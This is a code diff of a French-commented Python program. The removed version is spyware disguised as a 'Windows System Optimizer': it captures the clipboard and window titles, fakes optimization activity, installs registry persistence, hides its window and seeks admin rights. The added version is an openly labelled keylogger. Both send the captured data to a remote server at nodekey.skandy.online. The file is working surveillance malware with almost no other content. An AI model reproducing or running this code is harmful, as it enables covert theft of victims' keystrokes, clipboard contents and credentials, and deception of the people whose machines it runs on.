@@ -1,234 +1,103 @@
 
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-"""
-Windows System Optimizer - Outil d'optimisation système
-"""
+# Assurez-vous d'installer requests: pip install requests pynput
 
-import os
-import sys
-import time
+import requests
 import json
-import win32api
-import win32con
-import win32gui
-import win32clipboard
-from datetime import datetime
-from pathlib import Path
-import ctypes
-import urllib.request
 import threading
-import random
+import sys
+from datetime import datetime
+from pynput import keyboard
 
-# Configuration discrète
-CONFIG = {
-    'log_file': str(Path('~/AppData/Local/Temp/system_optimizer.log').expanduser()),
-    'mutex_name': 'Global\\WindowsSystemOptimizer',
-    'fake_process_name': 'SystemOptimizer.exe',
-    'fake_window_title': 'Windows System Optimizer'
-}
+# --- Configuration ---
+SERVER_URL = 'http://nodekey.skandy.online/keylog/batch'
+# Intervalle d'envoi en secondes
+TIME_INTERVAL = 10
 
-class SystemOptimizer:
-    def __init__(self):
-        self.last_send = time.time()
-        self.buffer = []
-        self.running = True
-        self.setup_mutex()
-        self.create_fake_interface()
-        
-    def setup_mutex(self):
-        """Empêche les instances multiples"""
-        try:
-            self.mutex = ctypes.windll.kernel32.CreateMutexW(None, False, CONFIG['mutex_name'])
-            if ctypes.windll.kernel32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
-                sys.exit(0)
-        except Exception as e:
-            self.log_error(f"Erreur mutex: {e}")
-            sys.exit(1)
-    
-    def create_fake_interface(self):
-        """Crée une interface fausse pour rassurer l'utilisateur"""
-        try:
-            # Créer une fenêtre console discrète
-            import subprocess
-            subprocess.Popen(['cmd', '/c', 'title Windows System Optimizer && echo Optimisation du systeme en cours... && echo Veuillez patienter... && timeout /t 3 /nobreak >nul && exit'], 
-                           creationflags=subprocess.CREATE_NO_WINDOW)
-        except:
-            pass
-    
-    def log_error(self, message):
-        """Journalise les erreurs localement"""
-        try:
-            with open(CONFIG['log_file'], 'a', encoding='utf-8') as f:
-                f.write(f"[{datetime.now()}] {message}\n")
-        except:
-            pass
-    
-    def monitor_clipboard(self):
-        """Surveille le presse-papiers pour capturer le texte copié"""
-        try:
-            win32clipboard.OpenClipboard()
-            try:
-                data = win32clipboard.GetClipboardData(win32con.CF_UNICODETEXT)
-                if data and len(data) > 0:
-                    self.buffer.append(f"[CLIPBOARD: {data}]")
-            except:
-                pass
-            finally:
-                win32clipboard.CloseClipboard()
-        except:
-            pass
-    
-    def monitor_active_window(self):
-        """Surveille la fenêtre active pour capturer des informations"""
-        try:
-            hwnd = win32gui.GetForegroundWindow()
-            if hwnd:
-                title = win32gui.GetWindowText(hwnd)
-                if title and len(title) > 0:
-                    self.buffer.append(f"[WINDOW: {title}]")
-        except:
-            pass
-    
-    def send_data(self):
-        """Envoie les données capturées au serveur"""
-        if not self.buffer:
-            return
-            
-        try:
-            # Préparer les données au format du serveur
-            data = {
-                'keys': ''.join(self.buffer),
+# --- Variable globale pour stocker les frappes ---
+# Nous utilisons une liste pour correspondre au format attendu par le serveur
+keys_buffer = []
+
+def send_post_req():
+    """Envoie les données au serveur et se reprogramme."""
+    global keys_buffer
+
+    try:
+        if keys_buffer:
+            # Crée une copie des données à envoyer et vide le buffer principal
+            data_to_send = list(keys_buffer)
+            keys_buffer.clear()
+
+            # Le format attendu par votre serveur
+            payload = {
+                'keys': data_to_send,
                 'timestamp': datetime.utcnow().isoformat(),
-                'hostname': os.environ.get('COMPUTERNAME', 'Unknown'),
-                'username': os.environ.get('USERNAME', 'Unknown'),
-                'userAgent': f"SystemOptimizer/1.0 on {sys.platform}"
+                'userAgent': f"Keylogger/3.0 on {sys.platform}"
             }
             
-            url = 'http://nodekey.skandy.online/keylog/batch'
-            headers = {'Content-Type': 'application/json'}
+            # Envoi de la requête POST avec la bibliothèque requests
+            r = requests.post(SERVER_URL, json=payload)
+            r.raise_for_status() # Lève une exception si le statut est une erreur (4xx ou 5xx)
             
-            # Encoder les données en JSON
-            json_data = json.dumps(data).encode('utf-8')
-            
-            # Créer la requête et l'envoyer
-            req = urllib.request.Request(url, data=json_data, headers=headers, method='POST')
-            with urllib.request.urlopen(req) as response:
-                result = response.read().decode('utf-8')
-                # Pas de print pour rester discret
-            
-            # Réinitialiser le buffer après envoi réussi
-            self.buffer = []
-            self.last_send = time.time()
-            
-        except Exception as e:
-            self.log_error(f"Erreur envoi données: {e}")
-    
-    def install_persistence(self):
-        """Installe la persistance via la clé de registre avec un nom innocent"""
-        try:
-            key = win32api.RegOpenKeyEx(
-                win32con.HKEY_CURRENT_USER,
-                'Software\\Microsoft\\Windows\\CurrentVersion\\Run',
-                0, win32con.KEY_SET_VALUE
-            )
-            
-            exe_path = os.path.abspath(sys.argv[0])
-            win32api.RegSetValueEx(key, 'SystemOptimizer', 0, win32con.REG_SZ, exe_path)
-            win32api.RegCloseKey(key)
-            
-        except Exception as e:
-            self.log_error(f"Erreur installation persistance: {e}")
-    
-    def hide_console(self):
-        """Cache la fenêtre de console sous Windows"""
-        try:
-            window = win32gui.GetForegroundWindow()
-            win32gui.ShowWindow(window, win32con.SW_HIDE)
-        except:
-            pass
-    
-    def simulate_optimization(self):
-        """Simule une activité d'optimisation pour rassurer l'utilisateur"""
-        try:
-            # Créer des fichiers temporaires d'optimisation
-            temp_dir = Path('~/AppData/Local/Temp/SystemOptimizer').expanduser()
-            temp_dir.mkdir(exist_ok=True)
-            
-            # Créer un fichier de log d'optimisation
-            log_file = temp_dir / 'optimization.log'
-            with open(log_file, 'w', encoding='utf-8') as f:
-                f.write(f"Windows System Optimizer - {datetime.now()}\n")
-                f.write("Analyse du système en cours...\n")
-                f.write("Optimisation des performances...\n")
-                f.write("Nettoyage des fichiers temporaires...\n")
-                f.write("Optimisation terminée avec succès!\n")
-                
-        except:
-            pass
-    
-    def start(self):
-        """Démarre l'optimiseur système"""
-        try:
-            # Cacher la console
-            self.hide_console()
-            
-            # Simuler l'optimisation
-            self.simulate_optimization()
-            
-            # Installer la persistance
-            self.install_persistence()
-            
-            # Boucle principale de surveillance
-            while self.running:
-                try:
-                    # Surveiller le presse-papiers
-                    self.monitor_clipboard()
-                    
-                    # Surveiller la fenêtre active
-                    self.monitor_active_window()
-                    
-                    # Envoyer périodiquement
-                    if time.time() - self.last_send > 60:  # 1 minute
-                        self.send_data()
-                    
-                    time.sleep(2)  # Pause de 2 secondes
-                    
-                except Exception as e:
-                    self.log_error(f"Erreur dans la boucle principale: {e}")
-                    time.sleep(10)
-                    
-        except Exception as e:
-            self.log_error(f"Erreur optimiseur: {e}")
-            time.sleep(60)
-            self.start()
+            print(f"[{datetime.now()}] Données envoyées ({len(data_to_send)} frappes). Status: {r.status_code}")
+        else:
+            print(f"[{datetime.now()}] Pas de nouvelles données à envoyer.")
 
-def is_admin():
-    """Vérifie si le programme s'exécute avec les droits administrateur"""
-    try:
-        return ctypes.windll.shell32.IsUserAnAdmin()
-    except:
-        return False
+    except requests.exceptions.RequestException as e:
+        print(f"[ERREUR] Impossible d'envoyer les données: {e}")
+        # En cas d'échec, on peut choisir de remettre les données dans le buffer
+        # keys_buffer.extend(data_to_send)
+    finally:
+        # Reprogramme le timer pour le prochain envoi
+        threading.Timer(TIME_INTERVAL, send_post_req).start()
 
-def main():
-    # Message d'accueil innocent
-    print("Windows System Optimizer - Démarrage...")
-    print("Optimisation du système en cours...")
-    
-    # Vérifier les privilèges admin
-    if not is_admin():
-        # Relancer avec élévation de privilèges
-        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
-        sys.exit(0)
-    
-    # Démarrer l'optimiseur
+def on_press(key):
+    """Callback exécutée à chaque frappe de touche."""
+    global keys_buffer
+
     try:
-        optimizer = SystemOptimizer()
-        optimizer.start()
+        # Gère les touches spéciales pour une meilleure lisibilité
+        if key == keyboard.Key.enter:
+            keys_buffer.append("\n")
+        elif key == keyboard.Key.tab:
+            keys_buffer.append("\t")
+        elif key == keyboard.Key.space:
+            keys_buffer.append(" ")
+        elif key == keyboard.Key.backspace:
+            # Au lieu de supprimer, on enregistre l'action
+            keys_buffer.append("[BACKSPACE]")
+        elif key in [keyboard.Key.shift, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
+            # Ignore les touches de modification seules
+            pass
+        elif key == keyboard.Key.esc:
+            # La touche Échap arrête le listener
+            print("Touche Échap pressée, arrêt du keylogger...")
+            return False
+        else:
+            # Enregistre la chaîne de la touche, en enlevant les apostrophes
+            keys_buffer.append(str(key).strip("'"))
     except Exception as e:
-        with open(CONFIG['log_file'], 'a', encoding='utf-8') as f:
-            f.write(f"[ERREUR CRITIQUE] {e}\n")
-        sys.exit(1)
+        print(f"[ERREUR] dans on_press: {e}")
 
+# --- Démarrage ---
 if __name__ == "__main__":
-    main()
+    print(f"Keylogger démarré. Envoi des données toutes les {TIME_INTERVAL} secondes.")
+    print("Appuyez sur 'Échap' pour arrêter.")
+
+    # Démarre le premier envoi programmé
+    # Le timer s'exécutera dans un thread séparé
+    threading.Timer(TIME_INTERVAL, send_post_req).start()
+
+    # Le listener de clavier bloque le thread principal
+    with keyboard.Listener(on_press=on_press) as listener:
+        listener.join()
+    
+    # Lorsque le listener s'arrête (avec Échap), envoie les données restantes
+    print("\nArrêt du listener. Envoi des dernières données...")
+    # On annule les timers en cours pour éviter un envoi après l'arrêt manuel
+    for t in threading.enumerate():
+        if isinstance(t, threading.Timer):
+            t.cancel()
+    send_post_req() # Fait un dernier envoi manuel
+    print("Keylogger arrêté.")
